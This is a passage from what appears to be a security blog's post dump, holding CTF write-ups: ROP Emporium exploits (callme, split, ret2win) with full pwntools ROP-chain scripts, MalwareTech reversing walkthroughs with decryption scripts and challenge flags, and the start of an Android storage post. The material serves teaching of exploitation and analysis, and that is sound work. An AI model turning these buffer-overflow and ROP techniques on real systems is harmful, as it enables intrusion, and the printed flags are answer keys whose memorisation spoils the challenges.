\u0026lt;+4\u0026gt;:\tsub rsp,0x30 0x0000000000000822 \u0026lt;+8\u0026gt;:\tmov QWORD PTR [rbp-0x18],rdi 0x0000000000000826 \u0026lt;+12\u0026gt;:\tmov QWORD PTR [rbp-0x20],rsi 0x000000000000082a \u0026lt;+16\u0026gt;:\tmov QWORD PTR [rbp-0x28],rdx 0x000000000000082e \u0026lt;+20\u0026gt;:\tmovabs rax,0xdeadbeefdeadbeef 0x0000000000000838 \u0026lt;+30\u0026gt;:\tcmp QWORD PTR [rbp-0x18],rax 0x000000000000083c \u0026lt;+34\u0026gt;:\tjne 0x912 \u0026lt;callme_one+248\u0026gt; 0x0000000000000842 \u0026lt;+40\u0026gt;:\tmovabs rax,0xcafebabecafebabe 0x000000000000084c \u0026lt;+50\u0026gt;:\tcmp QWORD PTR [rbp-0x20],rax 0x0000000000000850 \u0026lt;+54\u0026gt;:\tjne 0x912 \u0026lt;callme_one+248\u0026gt; 0x0000000000000856 \u0026lt;+60\u0026gt;:\tmovabs rax,0xd00df00dd00df00d 0x0000000000000860 \u0026lt;+70\u0026gt;:\tcmp QWORD PTR [rbp-0x28],rax 0x0000000000000864 \u0026lt;+74\u0026gt;:\tjne 0x912 \u0026lt;callme_one+248\u0026gt; 0x000000000000086a \u0026lt;+80\u0026gt;:\tmov QWORD PTR [rbp-0x8],0x0 0x0000000000000872 \u0026lt;+88\u0026gt;:\tlea rsi,[rip+0x32f] # 0xba8 0x0000000000000879 \u0026lt;+95\u0026gt;:\tlea rdi,[rip+0x32a] # 0xbaa ------ ------ 0x0000000000000912 \u0026lt;+248\u0026gt;:\tlea rdi,[rip+0x301] # 0xc1a 0x0000000000000919 \u0026lt;+255\u0026gt;:\tcall 0x6c0 \u0026lt;puts@plt\u0026gt; 0x000000000000091e \u0026lt;+260\u0026gt;:\tmov edi,0x1 0x0000000000000923 \u0026lt;+265\u0026gt;:\tcall 0x720 \u0026lt;exit@plt\u0026gt; 0x0000000000000928 \u0026lt;+270\u0026gt;:\tnop 0x0000000000000929 \u0026lt;+271\u0026gt;:\tleave 0x000000000000092a \u0026lt;+272\u0026gt;:\tret End of assembler dump. (gdb) From the disassembly code above, we can we are comparing our arguments in which we are passing to callme_one function. if the string values are not equal to values passed to the rdi, rsi and rdx registers the program exits, otherwise we get a flag.\nFrom previous knowledge of solving other challenges, we need to overwrite the return address with the pop rdi, pop rsi, pop rdx, ret gadget and call each function in a sequential manner.\nExploit Fully working rop chain code is as shown below.\nimport pwn pwn.context.encoding = \u0026#34;latin-1\u0026#34; pwn.warnings.simplefilter(\u0026#34;ignore\u0026#34;) pwn.context.arch = \u0026#34;amd64\u0026#34; io = pwn.process(\u0026#39;./callme\u0026#39;) pop_rdi_rsi_rdx = pwn.p64(0x0040093c) #pop rdi; pop rsi; pop rdx; ret gadget arg1 = pwn.p64(0xdeadbeefdeadbeef) arg2 = pwn.p64(0xcafebabecafebabe) arg3 = pwn.p64(0xd00df00dd00df00d) callme_one_addr = pwn.p64(0x0000000000400720) callme_two_addr = pwn.p64(0x0000000000400740) callme_three_addr =pwn.p64(0x00000000004006f0) #call the callme_one function callme_one = pop_rdi_rsi_rdx callme_one += arg1 callme_one += arg2 callme_one += arg3 callme_one += callme_one_addr #callme_two function callme_two = pop_rdi_rsi_rdx callme_two += arg1 callme_two += arg2 callme_two += arg3 callme_two += callme_two_addr #callme_three function callme_three = pop_rdi_rsi_rdx callme_three += arg1 callme_three += arg2 callme_three += arg3 callme_three += callme_three_addr payload = b\u0026#34;A\u0026#34; *32 #fill the buffer payload += b\u0026#34;B\u0026#34; * 8 #overwrite the rbp payload += callme_one payload += callme_two payload += callme_three io.writeafter(\u0026#39;\u0026gt;\u0026#39;, payload) pwn.info(io.clean().decode()) Successful execution of the above code, we get rewarded with a correct flag.\n \n","date":"2021-12-20T20:49:43+03:00","image":"https://thuri10.github.io/post/ropemporium/callme.jpg","permalink":"https://thuri10.github.io/p/return-oriented-programming-callme/","title":"Return-Oriented Programming - Callme"},{"content":"Introduction Challenge Description\n The elements that allowed you to complete ret2win are still present, they\u0026rsquo;ve just been split apart. Find them and recombine them using a short ROP chain\n The goal of this challenge is to understand how function arguments are passed in 64bit machine when doing return oriented programming. The target binary can be downloaded from the authors website ropemporium.\nFirst we check the binary protections enabled on the downloaded. Only NX (Not executable) is enabled on the device according to checksec binary utility as shown in the image below.\nvx@archie:split$ checksec --file=split Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) From analysis of binary we use gdb debugger in order to analyze the functions present in the binary in order to understand the logic. We disassemble pwnme function as in the image below.The function looks familiar as for the ret2win function.\n(gdb) disas pwnme Dump of assembler code for function pwnme: 0x00000000004006e8 \u0026lt;+0\u0026gt;:\tpush rbp 0x00000000004006e9 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x00000000004006ec \u0026lt;+4\u0026gt;:\tsub rsp,0x20 0x00000000004006f0 \u0026lt;+8\u0026gt;:\tlea rax,[rbp-0x20] 0x00000000004006f4 \u0026lt;+12\u0026gt;:\tmov edx,0x20 0x00000000004006f9 \u0026lt;+17\u0026gt;:\tmov esi,0x0 0x00000000004006fe \u0026lt;+22\u0026gt;:\tmov rdi,rax 0x0000000000400701 \u0026lt;+25\u0026gt;:\tcall 0x400580 \u0026lt;memset@plt\u0026gt; 0x0000000000400706 \u0026lt;+30\u0026gt;:\tmov edi,0x400810 0x000000000040070b \u0026lt;+35\u0026gt;:\tcall 0x400550 \u0026lt;puts@plt\u0026gt; 0x0000000000400710 \u0026lt;+40\u0026gt;:\tmov edi,0x40083c 0x0000000000400715 \u0026lt;+45\u0026gt;:\tmov eax,0x0 0x000000000040071a \u0026lt;+50\u0026gt;:\tcall 0x400570 \u0026lt;printf@plt\u0026gt; 0x000000000040071f \u0026lt;+55\u0026gt;:\tlea rax,[rbp-0x20] 0x0000000000400723 \u0026lt;+59\u0026gt;:\tmov edx,0x60 0x0000000000400728 \u0026lt;+64\u0026gt;:\tmov rsi,rax 0x000000000040072b \u0026lt;+67\u0026gt;:\tmov edi,0x0 0x0000000000400730 \u0026lt;+72\u0026gt;:\tcall 0x400590 \u0026lt;read@plt\u0026gt; 0x0000000000400735 \u0026lt;+77\u0026gt;:\tmov edi,0x40083f 0x000000000040073a \u0026lt;+82\u0026gt;:\tcall 0x400550 \u0026lt;puts@plt\u0026gt; 0x000000000040073f \u0026lt;+87\u0026gt;:\tnop 0x0000000000400740 \u0026lt;+88\u0026gt;:\tleave 0x0000000000400741 \u0026lt;+89\u0026gt;:\tret End of assembler dump. (gdb) From the above code, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset is used to overwrite any values that is present in the memory area specified. The memory region we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the boundary of base pointer address in the stack.\n \nNext function is read function, which reads for user input from the standard input file descriptor and stores in the specified buffer. From disassembled code, we are reading 0x60 bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.\nssize_t read(int fd, void *buf, size_t count); For this challenge we don`t have a ret2win function which we are to return to. From the disassembly of the binary we have an interesting function called usefulFunction. The usefulFunction, does listing of the files in the directory when called by the function.\n(gdb) disas usefulFunction Dump of assembler code for function usefulFunction: 0x0000000000400742 \u0026lt;+0\u0026gt;:\tpush rbp 0x0000000000400743 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x0000000000400746 \u0026lt;+4\u0026gt;:\tmov edi,0x40084a 0x000000000040074b \u0026lt;+9\u0026gt;:\tcall 0x400560 \u0026lt;system@plt\u0026gt; 0x0000000000400750 \u0026lt;+14\u0026gt;:\tnop 0x0000000000400751 \u0026lt;+15\u0026gt;:\tpop rbp 0x0000000000400752 \u0026lt;+16\u0026gt;:\tret End of assembler dump. (gdb) x/s 0x40084a 0x40084a:\t\u0026#34;/bin/ls\u0026#34; (gdb) Goal is to pass a different string to the system function instead of \u0026quot;/bin/ls\u0026quot;\nFrom the authors hint, we can look for useful hints in the binary using either radare2 or rizin. Both tools perform the same function, it is a matter of choice.\n Now that you\u0026rsquo;ve gathered the elements of your exploit you can start to piece them together, you want to call system() with the \u0026quot;/bin/cat flag.txt\u0026quot; string as the only argument. You\u0026rsquo;ll also have to start dealing with the differences between the various architectures' calling conventions.\n Opening the binary in radare2, we can use iz command to look for strings. The goal is to read the flag from the system.\n[0x004005b0]\u0026gt; iz nth paddr vaddr len size section type string --------------------------------------------------------------------------------------------- 0 0x000007e8 0x004007e8 21 22 .rodata ascii split by ROP Emporium 1 0x000007fe 0x004007fe 7 8 .rodata ascii x86_64\\n 2 0x00000806 0x00400806 8 9 .rodata ascii \\nExiting 3 0x00000810 0x00400810 43 44 .rodata ascii Contriving a reason to ask user for data... 4 0x0000083f 0x0040083f 10 11 .rodata ascii Thank you! 5 0x0000084a 0x0040084a 7 8 .rodata ascii /bin/ls 0 0x00001060 0x00601060 17 18 .data ascii /bin/cat flag.txt We have an important string \u0026quot;/bin/cat flag.txt\u0026quot; which will enable us to complete our goal. Now we need pass the string to system function as follows system('/bin/cat flag.txt').\nFor building ropchain, we need to understand the calling conventions of AMD64 ABI.The calling convention passes the arguments to the registers in the following order RDI, RSI, RDX, RCX, R8 and R9.\nBecause the system function receives one argument, we need to look for one gadgets that we control the rdi address.\nWhat are gadgets? Gadgets are sequence of instructions the end with ret instruction. Because we want to load a value into rdi register, we look for a pop pop rdi; ret instruction in order to pass an argument to the system function.\nFor searching gadget in radare2/rizin, use /R command as shown in the image below.\n  Now we need to chain ropchain exploit as shown in the image below.\n ropchain \nThe goal is to overwrite the return address with the address of \u0026ldquo;pop rdi, ret \u0026ldquo; and then call system function. we need to fill the buffer memory with 32bytes, 8 bytes more to overwrite the rbp address and 8 bytes teo overwrite the return address with pop rdi address.\nExploit Full exploit of split challenge is;\nimport pwn pwn.context.encoding = \u0026#34;latin-1\u0026#34; pwn.warnings.simplefilter(\u0026#34;ignore\u0026#34;) pwn.context.arch = \u0026#34;amd64\u0026#34; io = pwn.process(\u0026#34;./split\u0026#34;) system_addr = pwn.p64(0x400560) #address of system  pop_rdi_ret = pwn.p64(0x004007c3) # pop rdi; ret gadget  bin_cat_addr = pwn.p64(0x00601060) #bin cat flag.txt address  payload = b\u0026#34;A\u0026#34; * 32 #fill the buffer  payload += b\u0026#34;B\u0026#34; *8 # overwrite rbp payload += pop_rdi_ret # pop rdi gadget  payload += bin_cat_addr # argument passed to the system function payload += system_addr #call system  io.writeafter(\u0026#39;\u0026gt;\u0026#39;, payload) pwn.info(io.clean().decode()) Running the above code we get a flag.\n \n To avoid the segmentation fault of the above, we can overwrite the rbp address with exit function address in order to exit without segfault.\n ","date":"2021-12-20T20:49:37+03:00","image":"https://thuri10.github.io/post/ropemporium/split.jpg","permalink":"https://thuri10.github.io/p/return-oriented-programming-split/","title":"Return-Oriented Programming - Split"},{"content":"Introduction Challenge description\n Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.\n This challenge is classical pwn challenge of overwriting the return address with desired address you want to return to.\nThe binaries for the challenges can be downloaded from the author`s website ropemporium.The goal of first challenge is to call the ret2win function.\nAfter downloading the binary, the first thing is to check the binary protection enabled on the binary using checksec utility.\nvx@archie:ret2win$ checksec --file ret2win Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Only NX (Not executable) is enabled on the binary meaning we cannot execute code stored on the stack like shellcode.and the behavior of this program we will use gdb. gdb is a tools that enables to inspect the behavior of binaries at runtime.\n(gdb) info functions All defined functions: Non-debugging symbols: 0x0000000000400528 _init 0x0000000000400550 puts@plt 0x0000000000400560 system@plt 0x0000000000400570 printf@plt 0x0000000000400580 memset@plt 0x0000000000400590 read@plt 0x00000000004005a0 setvbuf@plt 0x00000000004005b0 _start 0x00000000004005e0 _dl_relocate_static_pie 0x00000000004005f0 deregister_tm_clones 0x0000000000400620 register_tm_clones 0x0000000000400660 __do_global_dtors_aux 0x0000000000400690 frame_dummy 0x0000000000400697 main 0x00000000004006e8 pwnme 0x0000000000400756 ret2win 0x0000000000400780 __libc_csu_init 0x00000000004007f0 __libc_csu_fini 0x00000000004007f4 _fini (gdb) The binary has various functions has as shown in the output above.For initial analysis we start at the main function which is the entrypoint of our program.\n(No debugging symbols found in ret2win) (gdb) disas main Dump of assembler code for function main: 0x0000000000400697 \u0026lt;+0\u0026gt;:\tpush rbp 0x0000000000400698 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x000000000040069b \u0026lt;+4\u0026gt;:\tmov rax,QWORD PTR [rip+0x2009b6] # 0x601058 \u0026lt;stdout@@GLIBC_2.2.5\u0026gt; 0x00000000004006a2 \u0026lt;+11\u0026gt;:\tmov ecx,0x0 0x00000000004006a7 \u0026lt;+16\u0026gt;:\tmov edx,0x2 0x00000000004006ac \u0026lt;+21\u0026gt;:\tmov esi,0x0 0x00000000004006b1 \u0026lt;+26\u0026gt;:\tmov rdi,rax 0x00000000004006b4 \u0026lt;+29\u0026gt;:\tcall 0x4005a0 \u0026lt;setvbuf@plt\u0026gt; 0x00000000004006b9 \u0026lt;+34\u0026gt;:\tmov edi,0x400808 0x00000000004006be \u0026lt;+39\u0026gt;:\tcall 0x400550 \u0026lt;puts@plt\u0026gt; 0x00000000004006c3 \u0026lt;+44\u0026gt;:\tmov edi,0x400820 0x00000000004006c8 \u0026lt;+49\u0026gt;:\tcall 0x400550 \u0026lt;puts@plt\u0026gt; 0x00000000004006cd \u0026lt;+54\u0026gt;:\tmov eax,0x0 0x00000000004006d2 \u0026lt;+59\u0026gt;:\tcall 0x4006e8 \u0026lt;pwnme\u0026gt; 0x00000000004006d7 \u0026lt;+64\u0026gt;:\tmov edi,0x400828 0x00000000004006dc \u0026lt;+69\u0026gt;:\tcall 0x400550 \u0026lt;puts@plt\u0026gt; 0x00000000004006e1 \u0026lt;+74\u0026gt;:\tmov eax,0x0 0x00000000004006e6 \u0026lt;+79\u0026gt;:\tpop rbp 0x00000000004006e7 \u0026lt;+80\u0026gt;:\tret End of assembler dump. (gdb) From the initial analysis of the main function, we are calling an interesting function called pwnme. Next disassemble pwnme function to understand the behavior.\n(gdb) disas pwnme Dump of assembler code for function pwnme: 0x00000000004006e8 \u0026lt;+0\u0026gt;:\tpush rbp 0x00000000004006e9 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x00000000004006ec \u0026lt;+4\u0026gt;:\tsub rsp,0x20 0x00000000004006f0 \u0026lt;+8\u0026gt;:\tlea rax,[rbp-0x20] 0x00000000004006f4 \u0026lt;+12\u0026gt;:\tmov edx,0x20 0x00000000004006f9 \u0026lt;+17\u0026gt;:\tmov esi,0x0 0x00000000004006fe \u0026lt;+22\u0026gt;:\tmov rdi,rax 0x0000000000400701 \u0026lt;+25\u0026gt;:\tcall 0x400580 \u0026lt;memset@plt\u0026gt; 0x0000000000400706 \u0026lt;+30\u0026gt;:\tmov edi,0x400838 0x000000000040070b \u0026lt;+35\u0026gt;:\tcall 0x400550 \u0026lt;puts@plt\u0026gt; 0x0000000000400710 \u0026lt;+40\u0026gt;:\tmov edi,0x400898 0x0000000000400715 \u0026lt;+45\u0026gt;:\tcall 0x400550 \u0026lt;puts@plt\u0026gt; 0x000000000040071a \u0026lt;+50\u0026gt;:\tmov edi,0x4008b8 0x000000000040071f \u0026lt;+55\u0026gt;:\tcall 0x400550 \u0026lt;puts@plt\u0026gt; 0x0000000000400724 \u0026lt;+60\u0026gt;:\tmov edi,0x400918 0x0000000000400729 \u0026lt;+65\u0026gt;:\tmov eax,0x0 0x000000000040072e \u0026lt;+70\u0026gt;:\tcall 0x400570 \u0026lt;printf@plt\u0026gt; 0x0000000000400733 \u0026lt;+75\u0026gt;:\tlea rax,[rbp-0x20] 0x0000000000400737 \u0026lt;+79\u0026gt;:\tmov edx,0x38 0x000000000040073c \u0026lt;+84\u0026gt;:\tmov rsi,rax 0x000000000040073f \u0026lt;+87\u0026gt;:\tmov edi,0x0 0x0000000000400744 \u0026lt;+92\u0026gt;:\tcall 0x400590 \u0026lt;read@plt\u0026gt; 0x0000000000400749 \u0026lt;+97\u0026gt;:\tmov edi,0x40091b 0x000000000040074e \u0026lt;+102\u0026gt;:\tcall 0x400550 \u0026lt;puts@plt\u0026gt; 0x0000000000400753 \u0026lt;+107\u0026gt;:\tnop 0x0000000000400754 \u0026lt;+108\u0026gt;:\tleave 0x0000000000400755 \u0026lt;+109\u0026gt;:\tret End of assembler dump. From the disassembled code above, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset is used to overwrite any values present memory area specified. The memory are we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer as shown in the stack diagram below.\n \nTherefore the next function is read function, which reads from the standard input file descriptor and stores in the specified buffer.From the disassembled code we see we are reading 0x38 bytes from the user input and storing it in our buffer.\nread(0, *[rbp-0x20], 0x38) //0 is file descriptor stdin Because we are reading more than the buffer can hold, we corrupt the adjacent memory regions therefore casusing a stack buffer overflow. Therefore in order to control the return address as shown in the stack image shown above is to fill the buffer, overwrite the rbp register and control the return address with our desired address which is ret2win function address.\nExploit The exploit code for this ret2win function is,\nimport pwn pwn.context.encoding = \u0026#34;latin-1\u0026#34; pwn.warnings.simplefilter(\u0026#34;ignore\u0026#34;) pwn.context.arch = \u0026#34;amd64\u0026#34; io = pwn.process(\u0026#39;./ret2win\u0026#39;) payload = b\u0026#34;A\u0026#34; * 32 # fill the buffer payload += b\u0026#34;B\u0026#34; * 8 #overwrite saved base pointer payload += pwn.p64(0x400756) #Address of ret2win function io.writeafter(\u0026#39;\u0026gt;\u0026#39;, payload) pwn.info(io.clean().decode()) Running the script we get the flag.\nvx@archie:ret2win$ python3 x.py [+] Starting local process \u0026#39;./ret2win\u0026#39;: pid 45427 [*] Thank you! Well done! Here\u0026#39;s your flag: ROPE{a_placeholder_32byte_flag!} [*] Process \u0026#39;./ret2win\u0026#39; stopped with exit code 0 (pid 45427) ","date":"2021-12-20T20:49:23+03:00","image":"https://thuri10.github.io/post/ropemporium/ret2win.jpg","permalink":"https://thuri10.github.io/p/return-oriented-programming-ret2win/","title":"Return-Oriented Programming - Ret2win"},{"content":"Challenge description.\n vm1.exe implements a simple 8-bit virtual machine (VM) to try and stop reverse engineers from retrieving the flag. The VM’s RAM contains the encrypted flag and some bytecode to decrypt it. Can you figure out how the VM works and write your own to decrypt the flag? A copy of the VM’s RAM has been provided in ram.bin (this data is identical to the ram content of the malware’s VM before execution and contains both the custom assembly code and encrypted flag).\n Introduction Main function analysis\n Main Function \nFrom the above image the HeapAlloc function allocates a block of memory from a heap. Heapalloc function above,allocates a memory block of size 0x1FB bytes. The pointer of the allocated memory block is called allocated_memblock as shown in the image.\nThe program does a memcpy of the content stored in the rambin offset to the new allocated memory block.\nvoid *memcpy(void *dest,const void *src, size_t count); Memcpy functions copies data from the source address to destination address of size 0x1fb. The destination address of this program is the allocate_memblock. Examining the bytes in the rambin file provided as part of the challenge and the content at rambin offset are the same as shown in the image below.\n Rambin   IDA HEX \nNext step is to analyze the sub_4022E0 function. The disassembled function graph looks like the one below.\n sub_4022E0 control flow loop \nFrom the disassembly above, the binary is doing some byte operations. The first graph block is doing a bitwise AND operation, which is responsible for setting both SF and ZF to zero.First it sets the value of eax register to 1, and then do a test operation. Because the conditional \u0026ldquo;jump if zero\u0026rdquo; is not true, we continue our execution to the next control block.\nWe do decompilation of the function using NSA ghidra tool.The decompiled of the function is shown below.\nint FUN_004022e0(void) { byte bVar1; uint uVar2; byte bVar3; byte counter; counter = 0; do { /* 0 */ uVar2 = (uint)counter; /* 2 */ bVar1 = counter + 1; bVar3 = counter + 2; counter = counter + 3; uVar2 = FUN_00402270((uint)*(byte *)(allocated_memblock + 0xff + uVar2), (uint)*(byte *)(allocated_memblock + 0xff + (uint)bVar1), (uint)*(byte *)(allocated_memblock + 0xff + (uint)bVar3)); } while ((uVar2 \u0026amp; 0xff) != 0); return uVar2; } The above c-code like is more easier to understand than the assembly code. From the analysis of the code, we are doing a while loop.The assembly equivalent of this operation is as the one shown in the first memory block of the function.\nloc_4022EA: mov eax, 1 test eax, eax jz short loc_402367 Therefore, we call the function FUN_00402270 while passing three arguments.The control graph below shows various operation executed by the binary depending on the argument passed to the function.\n control flow loop \nFrom the above graph, the function does a compare on the arguments passed with either 1, 2 or 3. If the condition is fulfilled, that operation branch is executed as shown in the image above.\nExample: if the argument value passed is 1, control flow branch to loc_4022E address as shown in the graph\nFor better understanding of the control flow, we decompile the function using ghidra, because idafree does not support x86 decompilation.The \u0026ldquo;C-like style\u0026rdquo; of the code looks like the one below.\nint FUN_00402270(int value1,int value2,int param_3) { if (value1 == 1) { *(undefined *)(allocated_memblock + value2) = (undefined)param_3; } else { if (value1 == 2) { value1 = allocated_memblock + value2; DAT_00404240 = *(byte *)value1; } else { if (value1 != 3) { return value1 \u0026amp; 0xffffff00; } value1 = allocated_memblock + value2; *(byte *)(allocated_memblock + value2) = *(byte *)value1 ^ DAT_00404240; } } return CONCAT31((int3)((uint)value1 \u0026gt;\u0026gt; 8),1); } The decompilation output of ghidra is not optimal, therefore decompiled code contains some cast which can be fixed by setting the correct data types in the functional signatures of the function.Because this is an easy VM, we can implement the above code in a python3 script in order to decrypt the contents of ram.bin file.\nSolution Fully implemented solution code is below.\n#implement decryption routine function in python #solution.py def fun_00402270(value1, value2, value3): global dat_420 if value1 == 1: membytes[value2] = value3 elif value1 == 2: dat_420 = membytes[value2] else: if value1 == 3: membytes[value2] = membytes[value2] ^ dat_420 else: return False return True if __name__ ==\u0026#34;__main__\u0026#34;: global membytes membytes = [] #open the encypted file and read bytes with open(\u0026#39;ram.bin\u0026#39;,\u0026#39;rb\u0026#39;) as rambin: membytes= list(rambin.read()) counter =0 uvar2 = 0 bvar1 = 1 bvar3 = 2 uvar2_response = True while uvar2_response: counter +=3 uvar2_response = fun_00402270(membytes[counter+ 0xff + uvar2], membytes[counter+0xff + bvar1], membytes[counter+ 0xff + bvar3]) print([chr(x) for x in membytes[:26]]) Running the above script in the terminal gets us our flag\nvx@archie:vm$ python3 x.py [\u0026#39;F\u0026#39;, \u0026#39;L\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;G\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;M\u0026#39;, \u0026#39;S\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;M\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;L\u0026#39;, \u0026#39;W\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;\\x00\u0026#39;] After a successful decryption of the rambin contents, the sub_4022E0 function return the pointer to the flag to main function as shown in the image below.\n Return value of sub_4022E0 \nTherefore the main function calculates the MD5 hash of the flag and outputs to the message dialogbox using MessageBoxA function.\nThe correct flag for the vm challenge is FLAG{VMS-ARE-FOR-MALWARE}\n","date":"2021-12-07T19:02:24+03:00","image":"https://thuri10.github.io/post/mal/vm.jpg","permalink":"https://thuri10.github.io/p/reversing-malwaretech-8-bit-bytecode-virtual-machine/","title":"Reversing MalwareTech 8-bit Bytecode Virtual Machine"},{"content":"This post is a brief walkthrough of \u0026ldquo;strings\u0026rdquo; challenges provided by MalwareTech. The challenges can be downloaded from the following website challenges.\nThe goal of \u0026ldquo;strings\u0026rdquo; challenges is to understand various implementation of strings in malware through static analysis. Strings are very useful in storing the configurations, decryption keys, data and c\u0026amp;c server addresses.\nFor analysis, I will use IDApro free for analysis. The author of the challenges provides a set of rules to follow while solving the challenges\nRules \u0026amp; Information\n- You are not require to run strings1.exe, this challenge is static analysis only. - Do not use a debugger or dumper to retrieve the decrypted flag from memory, this is cheating. - Analysis can be done using the free version of IDA Pro (you don’t need the debugger).  challenge1- Strings1 Description\n strings1.exe contains an un-encrypted flag stored within the executable. When run, the program will output an MD5 hash of the flag but not the original. Can you extract the flag?\n Knowing the binary is a windows PE, we drag the binary into IDA for analysis. The analysis of the binary is fast because the binary relative small. The disassembled code is as the one shown in the image below.\n Strings IDA \nFrom the analysis of the above code, we take flag as our input and print out the md5 of the flag. The md5_hash function is responsible for calculating the MD5 hash of the flag. The MessageBoxA is responsible for displaying the md5hash of the flag in a modal dialog box.\nThe correct flag is FLAG{CAN-I-MAKE-IT-ANYMORE-OBVIOUS}\nInputting the above flag in the authors website we get a correct message.\n Correct flag for strings1!\n Challenge2- Strings2  strings2.exe contains an un-encrypted flag stored within the executable. When run, the program will output an MD5 hash of the flag but not the original. Can you extract the flag?\n The goal of the second challenge is to understand about stack strings. stack strings is where strings are copied in single bytes, this helps malware avoid detection algorithms of common strings.\nDrag the binary into IDA for analysis. The main function of the binary looks like the one shown in the image below.\n Strings IDA \nFrom above disassembled code, the flag string is pushed in single bytes, and then passed to the md5_char function. m5_char function is responsible for calculating the MD5sum of the flag as previous seen in challenge1.\nThe flag of the second challenge is FLAG{STACK-STRINGS-ARE-BEST-STRINGS}\nChallenge3 - Strings3  strings3.exe contains an un-encrypted flag stored within the executable. When run, the program will output an MD5 hash of the flag but not the original. Can you extract the flag?\n The goal of the third challenge is to understand how malware uses resources section of the PE. Drag the strings3 binary into IDA and disassemble the main function. The disassembled code looks the one in the image below.\n Strings IDA \nLooking at the above function is we have a new function, FindResourceA. Looking at the windows documentation, FindResourceA function is responsible determination of a resource with the specified type and name in the specified module as shown in the code snip below.\nHRSRC FindResourceA( [in, optional] HMODULE hModule, [in] LPCSTR lpName, [in] LPCSTR lpType ); From the disassembly above, the name of the resource we are referencing is rc.rc. After the execution of FindResourceA function it returns an handle to the specified resource`s information block. In x86 assembly code the return values of functions are put in eax register.\nFrom the above code we can reconstruct the c-style code of the FindResource function.\nFindResourceA(0, \u0026#34;rc.rc\u0026#34;, 6) The handle module is 0 which is then stored in eax register and then used for calculation of the UID of the resource as shown in assembly below.\nmov [ebp+var_8], eax mov eax, 1 shl eax, 8 xor edx, edx inc edx shl edx, 4 or eax, edx From the above assembly code, the value of eax is 0. The first line saves eax value to a memory register.\nSecond line increments the value of eax register by 1. Therefore the new value of eax register is eax=1.\nThird line, shifts the bits value of eax register to the left by 8 times. we calculate the new value using python.\n\u0026gt;\u0026gt;\u0026gt; 1 \u0026lt;\u0026lt;8 256 \u0026gt;\u0026gt;\u0026gt; value of 1 shifted to the left 8 times becomes 256 as shown above.\nFourth line, is we are clearing the edx register through xor operation. Therefore the value of edx is 0.\nLine 5 we increment the value of edx by 1. The new value stored in edx register is 1, edx=1 .\nLine 6 we shift the value of edx register by 4 positions to the left.\n\u0026gt;\u0026gt;\u0026gt; 1 \u0026lt;\u0026lt;4 16 \u0026gt;\u0026gt;\u0026gt; From the calculation above, the new value od edx register is 16. edx=16. Therefore for the last line we are doing a bitwise inclusive OR operation of value at eax and edx register.\nThe values for eax and edx registers are 256 and 16 respectively.\n\u0026gt;\u0026gt;\u0026gt; 256 | 16 272 \u0026gt;\u0026gt;\u0026gt; The result of the bits operation are therefore stored on the eax register. The new eax value is 272. Finally the value of eax register is the stored in memory address referenced below by UID\nmov [ebp+UID], eax  Strings IDA \nThe analysis of the disassembled code above, shows the binary loads a resource from the executable referenced by uID. The function structure for the LoadStringA functions looks like the one below.\nint LoadStringA( [in, optional] HINSTANCE hInstance, [in] UINT uID, [out] LPSTR lpBuffer, [in] int cchBufferMax ); The uID integer value of the resource to be loaded is 272. For viewing the executable resources you can use the ResourcesEditor tool or python3 pefile library as shown in the code below.\nimport pefile pe = pefile.PE(\u0026#34;./strings3.exe_\u0026#34;)*** pe.print_info() The above 2 line of python3 code print all the information about the executable. As shown below is our resources section and references the string uid we are loading.\n PE Resources \nFrom the image above, we are loading FLAG{RESOURCES-ARE-POPULAR-FOR-MALWARE} string to our buffer through LoadStringA function which is referenced by uid 272. The pointer to the string is then passed to md5 function which is then used for calculating the md5 value of the string and then displayed in the modal box.\nThe correct flag of the challenge is FLAG{RESOURCES-ARE-POPULAR-FOR-MALWARE}.\nFor learning more about resource section of Portable Executable, check PE resources by @struppigel .\n","date":"2021-12-07T19:02:13+03:00","image":"https://thuri10.github.io/post/mal/strings.jpg","permalink":"https://thuri10.github.io/p/static-analysis-of-malware-strings/","title":"Static Analysis of Malware Strings"},{"content":"Insecure Storages This is the second part series of the android application security. This part focuses on the security of sqlite databases, firebase and AWS security.\nFlag7 - Sqlite What is sqlite?\nSqlite is a structure query base database that enables applications to do local storage in the application directory. The goal of the challenge is to understand how local storage of databases may lead to leakage of information.\nFirst step is to decompile the FlagSevenSqliteActivity using jadx.\nDuring the analysis of new android activity, we start analysis on the onCreate method.oncreate is the first method to be called by an application when an activity is started.\nThe decompiled oncreate method is as shown below.\npublic void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_flag_seven_sqlite); C((Toolbar) findViewById(R.id.toolbar)); j.g.a(this); H(); ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new a()); SQLiteDatabase writableDatabase = this.u.getWritableDatabase(); ContentValues contentValues = new ContentValues(); contentValues.put(\u0026#34;title\u0026#34;, Base64.decode(\u0026#34;VGhlIGZsYWcgaGFzaCE=\u0026#34;, 0)); contentValues.put(\u0026#34;subtitle\u0026#34;, Base64.decode(\u0026#34;MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=\u0026#34;, 0)); 